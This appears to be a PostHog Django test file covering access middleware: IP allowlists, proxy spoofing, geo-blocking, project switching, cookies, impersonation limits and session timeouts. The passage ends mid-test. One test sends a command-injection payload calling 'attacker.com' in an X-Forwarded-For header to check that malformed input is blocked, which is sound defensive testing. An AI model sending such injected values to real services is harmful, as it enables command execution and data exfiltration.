from datetime import datetime, timedelta

from freezegun import freeze_time
from posthog.test.base import APIBaseTest, override_settings
from unittest.mock import patch

from django.conf import settings
from django.core.cache import cache
from django.urls import reverse

from rest_framework import status

from posthog.api.test.test_organization import create_organization
from posthog.api.test.test_team import create_team
from posthog.models import Action, Cohort, Dashboard, FeatureFlag, Insight
from posthog.models.organization import Organization
from posthog.models.team import Team
from posthog.models.user import User
from posthog.settings import SITE_URL


class TestAccessMiddleware(APIBaseTest):
    CONFIG_AUTO_LOGIN = False

    def test_ip_range(self):
        """
        Also test that capture endpoint is not restrictied by ALLOWED_IP_BLOCKS
        """

        with self.settings(ALLOWED_IP_BLOCKS=["192.168.0.0/31", "127.0.0.0/25", "128.0.0.1"]):
            # not in list
            response = self.client.get("/", REMOTE_ADDR="10.0.0.1")
            self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertIn(b"PostHog is not available", response.content)

            # /31 block
            response = self.client.get("/", REMOTE_ADDR="192.168.0.1")
            self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertNotIn(b"PostHog is not available", response.content)

            response = self.client.get("/", REMOTE_ADDR="192.168.0.2")
            self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertIn(b"PostHog is not available", response.content)

            # /24 block
            response = self.client.get("/", REMOTE_ADDR="127.0.0.1")
            self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertNotIn(b"PostHog is not available", response.content)

            response = self.client.get("/", REMOTE_ADDR="127.0.0.100")
            self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertNotIn(b"PostHog is not available", response.content)

            response = self.client.get("/", REMOTE_ADDR="127.0.0.200")
            self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertIn(b"PostHog is not available", response.content)

            # precise ip
            response = self.client.get("/", REMOTE_ADDR="128.0.0.1")
            self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertNotIn(b"PostHog is not available", response.content)

            response = self.client.get("/", REMOTE_ADDR="128.0.0.2")
            self.assertIn(b"PostHog is not available", response.content)

    def test_trusted_proxies(self):
        with self.settings(
            ALLOWED_IP_BLOCKS=["192.168.0.0/31", "127.0.0.0/25,128.0.0.1"],
            USE_X_FORWARDED_HOST=True,
        ):
            with self.settings(TRUSTED_PROXIES="10.0.0.1"):
                response = self.client.get(
                    "/", REMOTE_ADDR="10.0.0.1", headers={"x-forwarded-for": "192.168.0.1,10.0.0.1"}
                )
                self.assertNotIn(b"PostHog is not available", response.content)

    def test_attempt_spoofing(self):
        with self.settings(
            ALLOWED_IP_BLOCKS=["192.168.0.0/31", "127.0.0.0/25,128.0.0.1"],
            USE_X_FORWARDED_HOST=True,
        ):
            with self.settings(TRUSTED_PROXIES="10.0.0.1"):
                response = self.client.get(
                    "/", REMOTE_ADDR="10.0.0.1", headers={"x-forwarded-for": "192.168.0.1,10.0.0.2"}
                )
                self.assertEqual(response.status_code, 403)
                self.assertIn(b"PostHog is not available", response.content)

    def test_trust_all_proxies(self):
        with self.settings(
            ALLOWED_IP_BLOCKS=["192.168.0.0/31", "127.0.0.0/25,128.0.0.1"],
            USE_X_FORWARDED_HOST=True,
        ):
            with self.settings(TRUST_ALL_PROXIES=True):
                response = self.client.get(
                    "/", REMOTE_ADDR="10.0.0.1", headers={"x-forwarded-for": "192.168.0.1,10.0.0.1"}
                )
                self.assertNotIn(b"PostHog is not available", response.content)

    def test_blocked_geoip_regions(self):
        with self.settings(
            BLOCKED_GEOIP_REGIONS=["DE"],
            USE_X_FORWARDED_HOST=True,
        ):
            with self.settings(TRUST_ALL_PROXIES=True):
                response = self.client.get(
                    "/",
                    REMOTE_ADDR="45.90.4.87",
                )
                self.assertIn(b"PostHog is not available", response.content)
                response = self.client.get(
                    "/",
                    REMOTE_ADDR="28.160.62.192",
                )
                self.assertNotIn(b"PostHog is not available", response.content)

        with self.settings(
            BLOCKED_GEOIP_REGIONS=["DE"],
            USE_X_FORWARDED_HOST=True,
        ):
            with self.settings(TRUST_ALL_PROXIES=True):
                response = self.client.get("/", REMOTE_ADDR="28.160.62.192", headers={"x-forwarded-for": ""})
                self.assertNotIn(b"PostHog is not available", response.content)

    def test_ip_with_port_stripped(self):
        """IP addresses with ports should have the port stripped before validation."""
        with self.settings(ALLOWED_IP_BLOCKS=["192.168.0.0/24"], USE_X_FORWARDED_HOST=True, TRUST_ALL_PROXIES=True):
            # IPv4 with port
            response = self.client.get("/", headers={"x-forwarded-for": "192.168.0.1:8080"})
            self.assertNotIn(b"PostHog is not available", response.content)

            # IPv6 with port (bracketed format)
            response = self.client.get("/", headers={"x-forwarded-for": "[::1]:443"})
            # ::1 is not in allowed blocks, so should be blocked
            self.assertIn(b"PostHog is not available", response.content)

    def test_malformed_ip_blocked(self):
        """Malformed IPs and attack payloads should be blocked (fail closed)."""
        with self.settings(ALLOWED_IP_BLOCKS=["0.0.0.0/0"], USE_X_FORWARDED_HOST=True, TRUST_ALL_PROXIES=True):
            # Attack payload in XFF header
            response = self.client.get(
                "/", headers={"x-forwarded-for": "nslookup${IFS}attacker.com||curl${IFS}attacker.com"}
            )
            self.assertIn(b"PostHog is not available", response.content)

            # Invalid IP format
            response = self.client.get("/", headers={"x-forwarded-for": "not-an-ip"})
            self.assertIn(b"PostHog is not available", response.content)

            # Valid IP should work
            response = self.client.get("/", headers={"x-forwarded-for": "192.168.1.1"})
            self.assertNotIn(b"PostHog is not available", response.content)


class TestAutoProjectMiddleware(APIBaseTest):
    # How many queries are made in the base app
    # On Cloud there's an additional multi_tenancy_organizationbilling query
    second_team: Team
    third_team: Team
    no_access_team: Team
    base_app_num_queries: int

    @classmethod
    def setUpTestData(cls):
        super().setUpTestData()
        cls.base_app_num_queries = 52
        # Create another team that the user does have access to
        cls.second_team = create_team(organization=cls.organization, name="Second Life")

        # some teams have non-standard API tokens
        cls.third_team = create_team(organization=cls.organization, name="Third Life")
        cls.third_team.api_token = "sTMFPsFhdP1Ssg"
        cls.third_team.save()

        other_org = create_organization(name="test org")
        cls.no_access_team = create_team(organization=other_org)

    def setUp(self):
        super().setUp()
        # Reset back to initial team/org for each test
        self.user.current_team = self.team
        self.user.current_organization = self.organization

    @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
    def test_project_switched_when_accessing_dashboard_of_another_accessible_team(self):
        dashboard = Dashboard.objects.create(team=self.second_team)

        with self.assertNumQueries(self.base_app_num_queries + 6):  # AutoProjectMiddleware adds 4 queries
            response_app = self.client.get(f"/dashboard/{dashboard.id}")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_dashboards_api = self.client.get(f"/api/projects/@current/dashboards/{dashboard.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_dashboards_api.status_code, 200)

    def test_project_switched_when_accessing_dashboard_of_another_accessible_team_with_trailing_slash(self):
        dashboard = Dashboard.objects.create(team=self.second_team)

        response_app = self.client.get(f"/dashboard/{dashboard.id}/")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_dashboards_api = self.client.get(f"/api/projects/@current/dashboards/{dashboard.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_dashboards_api.status_code, 200)

    def test_project_unchanged_when_accessing_dashboard_of_another_off_limits_team(self):
        _, _, third_team = Organization.objects.bootstrap(
            None,
            name="Third Party",
            slug="third-party",
            team_fields={"name": "Third Team"},
        )
        dashboard = Dashboard.objects.create(team=third_team)

        response_app = self.client.get(f"/dashboard/{dashboard.id}")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_dashboards_api = self.client.get(f"/api/projects/@current/dashboards/{dashboard.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.team.id)  # NOT third_team
        self.assertEqual(response_dashboards_api.status_code, 404)

    @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
    def test_project_unchanged_when_accessing_dashboards_list(self):
        with self.assertNumQueries(self.base_app_num_queries + 2):  # No AutoProjectMiddleware queries
            response_app = self.client.get(f"/dashboard")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.team.id)  # NOT third_team

    def test_project_switched_when_accessing_insight_of_another_accessible_team(self):
        insight = Insight.objects.create(team=self.second_team)

        response_app = self.client.get(f"/insights/{insight.short_id}")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_insights_api = self.client.get(f"/api/projects/@current/insights/{insight.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_insights_api.status_code, 200)

    def test_project_switched_when_accessing_insight_edit_mode_of_another_accessible_team(self):
        insight = Insight.objects.create(team=self.second_team)

        response_app = self.client.get(f"/insights/{insight.short_id}/edit")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_insights_api = self.client.get(f"/api/projects/@current/insights/{insight.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_insights_api.status_code, 200)

    def test_project_switched_when_accessing_action_of_another_accessible_team(self):
        action = Action.objects.create(team=self.second_team)

        response_app = self.client.get(f"/action/{action.id}")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_actions_api = self.client.get(f"/api/projects/@current/actions/{action.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_actions_api.status_code, 200)

    def test_project_switched_when_accessing_cohort_of_another_accessible_team(self):
        cohort = Cohort.objects.create(team=self.second_team, created_by=self.user)

        response_app = self.client.get(f"/cohorts/{cohort.id}")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_cohorts_api = self.client.get(f"/api/projects/@current/cohorts/{cohort.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_cohorts_api.status_code, 200)

    @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
    def test_project_switched_when_accessing_feature_flag_of_another_accessible_team(self):
        feature_flag = FeatureFlag.objects.create(team=self.second_team, created_by=self.user)

        with self.assertNumQueries(self.base_app_num_queries + 6):
            response_app = self.client.get(f"/feature_flags/{feature_flag.id}")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_feature_flags_api = self.client.get(f"/api/projects/@current/feature_flags/{feature_flag.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_feature_flags_api.status_code, 200)

    @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
    def test_project_unchanged_when_creating_feature_flag(self):
        with self.assertNumQueries(self.base_app_num_queries + 2):
            response_app = self.client.get(f"/feature_flags/new")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.team.id)

    def test_project_switched_when_accessing_another_project_by_id(self):
        project_1_request = self.client.get(f"/project/{self.team.pk}/home")
        response_users_api = self.client.get(f"/api/users/@me/")
        assert project_1_request.status_code == 200
        assert response_users_api.json().get("team", {}).get("id") == self.team.id

        project_2_request = self.client.get(f"/project/{self.second_team.pk}/home")
        response_users_api = self.client.get(f"/api/users/@me/")
        assert project_2_request.status_code == 200
        assert response_users_api.json().get("team", {}).get("id") == self.second_team.id

    def test_project_unchanged_when_accessing_inaccessible_project_by_id(self):
        project_1_request = self.client.get(f"/project/{self.team.pk}/home")
        response_users_api = self.client.get(f"/api/users/@me/")
        assert project_1_request.status_code == 200
        assert response_users_api.json().get("team", {}).get("id") == self.team.id

        project_2_request = self.client.get(f"/project/{self.no_access_team.pk}/home")
        response_users_api = self.client.get(f"/api/users/@me/")
        assert project_2_request.status_code == 200
        assert response_users_api.json().get("team", {}).get("id") == self.team.id

    def test_project_unchanged_when_accessing_missing_project_by_id(self):
        project_1_request = self.client.get(f"/project/{self.team.pk}/home")
        response_users_api = self.client.get(f"/api/users/@me/")
        assert project_1_request.status_code == 200
        assert response_users_api.json().get("team", {}).get("id") == self.team.id

        project_2_request = self.client.get(f"/project/999999/home")
        response_users_api = self.client.get(f"/api/users/@me/")
        assert project_2_request.status_code == 200
        assert response_users_api.json().get("team", {}).get("id") == self.team.id

    def test_project_redirects_to_new_team_when_accessing_project_by_token(self):
        res = self.client.get(f"/project/{self.second_team.api_token}/home")
        assert res.status_code == 302
        assert res.headers["Location"] == f"/project/{self.second_team.pk}/home"

    def test_project_redirects_to_posthog_org_style_tokens(self):
        res = self.client.get(
            f"/project/{self.third_team.api_token}/replay/018f5c3e-1a17-7f2b-ac83-32d06be3269b?t=2601"
        )
        assert res.status_code == 302, res.content
        assert (
            res.headers["Location"]
            == f"/project/{self.third_team.pk}/replay/018f5c3e-1a17-7f2b-ac83-32d06be3269b?t=2601"
        )

    def test_project_redirects_to_current_team_when_accessing_missing_project_by_token(self):
        res = self.client.get(f"/project/phc_123/home")
        assert res.status_code == 302
        assert res.headers["Location"] == f"/project/{self.team.pk}/home"

    def test_project_redirects_to_current_team_when_accessing_inaccessible_project_by_token(self):
        res = self.client.get(f"/project/{self.no_access_team.api_token}/home")
        assert res.status_code == 302
        assert res.headers["Location"] == f"/project/{self.team.pk}/home"

    def test_project_redirects_including_query_params(self):
        res = self.client.get(f"/project/phc_123?t=1")
        assert res.status_code == 302
        assert res.headers["Location"] == f"/project/{self.team.pk}?t=1"

        res = self.client.get(f"/project/phc_123/home?t=1")
        assert res.status_code == 302
        assert res.headers["Location"] == f"/project/{self.team.pk}/home?t=1"


@override_settings(CLOUD_DEPLOYMENT="US")  # As PostHog Cloud
class TestPostHogTokenCookieMiddleware(APIBaseTest):
    CONFIG_AUTO_LOGIN = False

    def test_logged_out_client(self):
        self.client.logout()
        response = self.client.get("/")
        self.assertEqual(0, len(response.cookies))

    def test_logged_in_client(self):
        self.client.force_login(self.user, backend="django.contrib.auth.backends.ModelBackend")
        response = self.client.get("/")
        self.assertEqual(response.status_code, status.HTTP_200_OK)

        ph_project_token_cookie = response.cookies["ph_current_project_token"]
        self.assertEqual(ph_project_token_cookie.key, "ph_current_project_token")
        self.assertEqual(ph_project_token_cookie.value, self.team.api_token)
        self.assertEqual(ph_project_token_cookie["path"], "/")
        self.assertEqual(ph_project_token_cookie["samesite"], "Strict")
        self.assertEqual(ph_project_token_cookie["httponly"], "")
        self.assertEqual(ph_project_token_cookie["domain"], "posthog.com")
        self.assertEqual(ph_project_token_cookie["comment"], "")
        self.assertEqual(ph_project_token_cookie["secure"], True)
        self.assertEqual(ph_project_token_cookie["max-age"], 31536000)

        ph_project_name_cookie = response.cookies["ph_current_project_name"]
        self.assertEqual(ph_project_name_cookie.key, "ph_current_project_name")
        self.assertEqual(ph_project_name_cookie.value, self.team.name)
        self.assertEqual(ph_project_name_cookie["path"], "/")
        self.assertEqual(ph_project_name_cookie["samesite"], "Strict")
        self.assertEqual(ph_project_name_cookie["httponly"], "")
        self.assertEqual(ph_project_name_cookie["domain"], "posthog.com")
        self.assertEqual(ph_project_name_cookie["comment"], "")
        self.assertEqual(ph_project_name_cookie["secure"], True)
        self.assertEqual(ph_project_name_cookie["max-age"], 31536000)

        ph_instance_cookie = response.cookies["ph_current_instance"]
        self.assertEqual(ph_instance_cookie.key, "ph_current_instance")
        self.assertEqual(ph_instance_cookie.value, SITE_URL)
        self.assertEqual(ph_instance_cookie["path"], "/")
        self.assertEqual(ph_instance_cookie["samesite"], "Strict")
        self.assertEqual(ph_instance_cookie["httponly"], "")
        self.assertEqual(ph_instance_cookie["domain"], "posthog.com")
        self.assertEqual(ph_instance_cookie["comment"], "")
        self.assertEqual(ph_instance_cookie["secure"], True)
        self.assertEqual(ph_instance_cookie["max-age"], 31536000)

        ph_last_login_method_cookie = response.cookies["ph_last_login_method"]
        self.assertEqual(ph_last_login_method_cookie.key, "ph_last_login_method")
        self.assertEqual(ph_last_login_method_cookie.value, "password")
        self.assertEqual(ph_last_login_method_cookie["path"], "/")
        self.assertEqual(ph_last_login_method_cookie["samesite"], "Strict")
        self.assertEqual(ph_last_login_method_cookie["httponly"], "")
        self.assertEqual(ph_last_login_method_cookie["domain"], "posthog.com")
        self.assertEqual(ph_last_login_method_cookie["comment"], "")
        self.assertEqual(ph_last_login_method_cookie["secure"], True)
        self.assertEqual(ph_last_login_method_cookie["max-age"], 31536000)

    def test_logout(self):
        self.client.force_login(self.user, backend="django.contrib.auth.backends.ModelBackend")
        response = self.client.get("/")
        self.assertEqual(response.status_code, status.HTTP_200_OK)

        self.assertEqual(response.cookies["ph_current_project_token"].key, "ph_current_project_token")
        self.assertEqual(response.cookies["ph_current_project_token"].value, self.team.api_token)
        self.assertEqual(response.cookies["ph_current_project_token"]["max-age"], 31536000)

        self.assertEqual(response.cookies["ph_current_project_name"].key, "ph_current_project_name")
        self.assertEqual(response.cookies["ph_current_project_name"].value, self.team.name)
        self.assertEqual(response.cookies["ph_current_project_name"]["max-age"], 31536000)

        self.assertEqual(response.cookies["ph_current_instance"].key, "ph_current_instance")
        self.assertEqual(response.cookies["ph_current_instance"].value, SITE_URL)
        self.assertEqual(response.cookies["ph_current_instance"]["max-age"], 31536000)

        self.assertEqual(response.cookies["ph_last_login_method"].key, "ph_last_login_method")
        self.assertEqual(response.cookies["ph_last_login_method"].value, "password")
        self.assertEqual(response.cookies["ph_last_login_method"]["max-age"], 31536000)

        response = self.client.get("/logout")

        # Check that the local cookies will be removed by having 'expires' in the past
        self.assertTrue(response.cookies["ph_current_project_token"]["expires"] == "Thu, 01 Jan 1970 00:00:00 GMT")
        self.assertTrue(response.cookies["ph_current_project_name"]["expires"] == "Thu, 01 Jan 1970 00:00:00 GMT")
        # We don't want to remove the ph_current_instance cookie
        self.assertNotIn("ph_current_instance", response.cookies)

        # Request a page after logging out
        response = self.client.get("/")

        # Check if the cookies are not present in the response
        self.assertNotIn("ph_current_project_token", response.cookies)
        self.assertNotIn("ph_current_project_name", response.cookies)


@override_settings(IMPERSONATION_TIMEOUT_SECONDS=100)
@override_settings(IMPERSONATION_IDLE_TIMEOUT_SECONDS=20)
@override_settings(ADMIN_PORTAL_ENABLED=True)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_KEY=None)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_SECRET=None)
class TestAutoLogoutImpersonateMiddleware(APIBaseTest):
    other_user: User

    def setUp(self):
        super().setUp()
        # Reset back to initial team/org for each test
        self.other_user = User.objects.create_and_join(
            self.organization, email="other-user@posthog.com", password="123456"
        )

        self.user.is_staff = True
        self.user.save()

    def get_csrf_token_payload(self):
        return {}

    def login_as_other_user(self):
        return self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            follow=True,
        )

    def test_staff_user_can_login(self):
        assert self.client.get("/api/users/@me").json()["email"] == self.user.email
        response = self.login_as_other_user()
        assert response.status_code == 200
        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"

    def test_not_staff_user_cannot_login(self):
        self.user.is_staff = False
        self.user.save()
        assert self.client.get("/api/users/@me").json()["email"] == self.user.email
        response = self.login_as_other_user()
        assert response.status_code == 200
        assert self.client.get("/api/users/@me").json()["email"] == self.user.email

    def test_after_idle_timeout_api_requests_401(self):
        now = datetime(2024, 1, 1, 12, 0, 0)
        with freeze_time(now):
            self.login_as_other_user()
            res = self.client.get("/api/users/@me")
            assert res.status_code == 200
            assert res.json()["email"] == "other-user@posthog.com"
            assert res.json()["is_impersonated_until"] == "2024-01-01T12:00:20+00:00"
            assert self.client.session.get("session_created_at") == now.timestamp()

        # Move forward by 19
        now = now + timedelta(seconds=19)
        with freeze_time(now):
            res = self.client.get("/api/users/@me")
            assert res.status_code == 200
            assert res.json()["email"] == "other-user@posthog.com"
            assert res.json()["is_impersonated_until"] == "2024-01-01T12:00:39+00:00"

        # Past idle timeout
        now = now + timedelta(seconds=21)

        with freeze_time(now):
            res = self.client.get("/api/users/@me")
            assert res.status_code == 401

    def test_after_total_timeout_api_requests_401(self):
        now = datetime(2024, 1, 1, 12, 0, 0)
        with freeze_time(now):
            self.login_as_other_user()
            res = self.client.get("/api/users/@me")
            assert res.status_code == 200
            assert res.json()["email"] == "other-user@posthog.com"
            assert res.json()["is_impersonated_until"] == "2024-01-01T12:00:20+00:00"
            assert self.client.session.get("session_created_at") == now.timestamp()

        for _ in range(4):
            # Move forward by 19 seconds 4 times for a total of 76 seconds
            now = now + timedelta(seconds=19)
            with freeze_time(now):
                res = self.client.get("/api/users/@me")
                assert res.status_code == 200
                assert res.json()["email"] == "other-user@posthog.com"
                # Format exactly like the date above
                assert res.json()["is_impersonated_until"] == (now + timedelta(seconds=20)).strftime(
                    "%Y-%m-%dT%H:%M:%S+00:00"
                )

        now = now + timedelta(seconds=19)
        with freeze_time(now):
            res = self.client.get("/api/users/@me")
            assert res.status_code == 200
            assert res.json()["email"] == "other-user@posthog.com"
            # Even though below the idle timeout, we now see the total timeout as that is earlier
            assert res.json()["is_impersonated_until"] == "2024-01-01T12:01:40+00:00"

        # Now even less than the idle time will take us past the total timeout
        now = now + timedelta(seconds=10)

        with freeze_time(now):
            res = self.client.get("/api/users/@me")
            assert res.status_code == 401

    def test_after_timeout_redirects_to_logout_then_admin(self):
        now = datetime.now()
        with freeze_time(now):
            self.login_as_other_user()

        with freeze_time(now + timedelta(seconds=35)):
            res = self.client.get("/dashboards")
            assert res.status_code == 302
            assert res.headers["Location"] == "/logout/"

            res = self.client.get("/logout/")
            assert res.status_code == 302
            assert res.headers["Location"] == f"/admin/posthog/user/{self.other_user.id}/change/"

            res = self.client.get("/api/users/@me")
            assert res.status_code == 200
            assert res.json()["email"] == "user1@posthog.com"


@override_settings(IMPERSONATION_TIMEOUT_SECONDS=100)
@override_settings(IMPERSONATION_IDLE_TIMEOUT_SECONDS=20)
@override_settings(ADMIN_PORTAL_ENABLED=True)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_KEY=None)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_SECRET=None)
class TestImpersonationReadOnlyMiddleware(APIBaseTest):
    other_user: User

    def setUp(self):
        super().setUp()
        self.other_user = User.objects.create_and_join(
            self.organization, email="other-user@posthog.com", password="123456"
        )
        self.user.is_staff = True
        self.user.save()

    def login_as_other_user(self):
        return self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            follow=True,
        )

    def login_as_other_user_read_only(self):
        return self.client.post(
            reverse("loginas-user-login-read-only", kwargs={"user_id": self.other_user.id}),
            follow=True,
        )

    def test_read_only_impersonation_blocks_write(self):
        """Verify read-only impersonation blocks DELETE requests with correct error."""
        dashboard = Dashboard.objects.create(team=self.team, name="Test Dashboard")

        self.login_as_other_user_read_only()

        # Verify we're logged in as the other user
        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"

        # Try to delete the dashboard
        response = self.client.delete(f"/api/projects/{self.team.id}/dashboards/{dashboard.id}/")

        assert response.status_code == 403
        response_data = response.json()
        assert response_data["type"] == "authentication_error"
        assert response_data["code"] == "impersonation_read_only"
        assert "read-only" in response_data["detail"].lower()

        # Verify dashboard still exists
        dashboard.refresh_from_db()
        assert dashboard.name == "Test Dashboard"

    def test_read_only_impersonation_allows_get_requests(self):
        """Verify read-only impersonation allows GET requests."""
        self.login_as_other_user_read_only()

        # Verify we're logged in as the other user
        response = self.client.get("/api/users/@me")
        assert response.status_code == 200
        assert response.json()["email"] == "other-user@posthog.com"

        # GET request to dashboards should work
        response = self.client.get(f"/api/projects/{self.team.id}/dashboards/")
        assert response.status_code == 200

    def test_read_only_impersonation_allows_query_endpoint(self):
        """Verify read-only impersonation allows POST to query endpoint."""
        self.login_as_other_user_read_only()

        # Verify we're logged in as the other user
        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"

        # POST to query endpoint - the query itself may fail but we shouldn't get blocked by the middleware
        response = self.client.post(
            f"/api/projects/{self.team.id}/query/",
            data={"query": {"kind": "EventsQuery", "select": ["event"]}},
            content_type="application/json",
        )

        # Should not be blocked by impersonation middleware (might get other errors)
        assert response.status_code != 403 or response.json().get("code") != "impersonation_read_only"

    def test_regular_impersonation_allows_write(self):
        """Verify regular (non-read-only) impersonation can still write."""
        dashboard = Dashboard.objects.create(team=self.team, name="Test Dashboard")

        self.login_as_other_user()

        # Verify we're logged in as the other user
        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"

        # Update should work with regular impersonation
        response = self.client.patch(
            f"/api/projects/{self.team.id}/dashboards/{dashboard.id}/",
            data={"name": "Updated Dashboard"},
            content_type="application/json",
        )

        assert response.status_code == 200

        # Verify dashboard was updated
        dashboard.refresh_from_db()
        assert dashboard.name == "Updated Dashboard"

    def test_impersonation_blocked_when_user_disallows(self):
        """Verify regular impersonation fails when target user has allow_impersonation=False."""
        self.other_user.allow_impersonation = False
        self.other_user.save()

        self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            follow=True,
        )

        # Should still be logged in as original user
        assert self.client.get("/api/users/@me").json()["email"] == self.user.email

    def test_read_only_impersonation_blocked_when_user_disallows(self):
        """Verify read-only impersonation fails when target user has allow_impersonation=False."""
        self.other_user.allow_impersonation = False
        self.other_user.save()

        self.client.post(
            reverse("loginas-user-login-read-only", kwargs={"user_id": self.other_user.id}),
            follow=True,
        )

        # Should still be logged in as original user
        assert self.client.get("/api/users/@me").json()["email"] == self.user.email

    def test_read_only_impersonation_logout_redirects_to_user_admin(self):
        """Verify logout from read-only impersonation redirects to user's admin page."""
        self.login_as_other_user_read_only()

        # Verify we're logged in as the other user
        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"

        # Logout
        response = self.client.get("/logout/")

        assert response.status_code == 302
        assert response.headers["Location"] == f"/admin/posthog/user/{self.other_user.id}/change/"

        # Verify we're back to original user
        assert self.client.get("/api/users/@me").json()["email"] == self.user.email


@override_settings(SESSION_COOKIE_AGE=100)
class TestSessionAgeMiddleware(APIBaseTest):
    def setUp(self):
        super().setUp()
        cache.clear()
        # Patch time.time before login to ensure session creation time is correct
        self.time_patcher = patch("time.time", return_value=1704110400.0)  # 2024-01-01 12:00:00
        self.time_patcher.start()
        self.client.force_login(self.user)
        self.time_patcher.stop()

    def tearDown(self):
        super().tearDown()
        cache.clear()
        # Ensure any remaining patches are stopped
        self.time_patcher.stop()

    @freeze_time("2024-01-01 12:00:00")
    @patch("time.time", return_value=1704110400.0)  # 2024-01-01 12:00:00
    def test_session_continues_when_not_expired(self, mock_time):
        # Initial request sets session creation time
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY), 1704110400.0)

        # Move forward 99 seconds (before timeout)
        mock_time.return_value = 1704110499.0  # 2024-01-01 12:01:39
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)

    @freeze_time("2024-01-01 12:00:00")
    @patch("time.time", return_value=1704110400.0)  # 2024-01-01 12:00:00
    def test_session_expires_after_total_time(self, mock_time):
        # Initial request sets session creation time
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY), 1704110400.0)

        # Move forward past total session age (101 seconds)
        mock_time.return_value = 1704110501.0  # 2024-01-01 12:01:41
        response = self.client.get("/")
        # Should redirect to login
        self.assertEqual(response.status_code, 302)
        self.assertEqual(
            response.headers["Location"], "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again."
        )

    @freeze_time("2024-01-01 12:00:00")
    @patch("time.time", return_value=1704110400.0)  # 2024-01-01 12:00:00
    def test_org_specific_session_timeout_from_cache(self, mock_time):
        # Set org-specific timeout in cache
        cache.set(f"org_session_age:{self.organization.id}", 50)

        # Initial request sets session creation time
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY), 1704110400.0)

        # Move forward past org timeout (51 seconds)
        mock_time.return_value = 1704110451.0  # 2024-01-01 12:00:51
        response = self.client.get("/")
        # Should redirect to login
        self.assertEqual(response.status_code, 302)
        self.assertEqual(
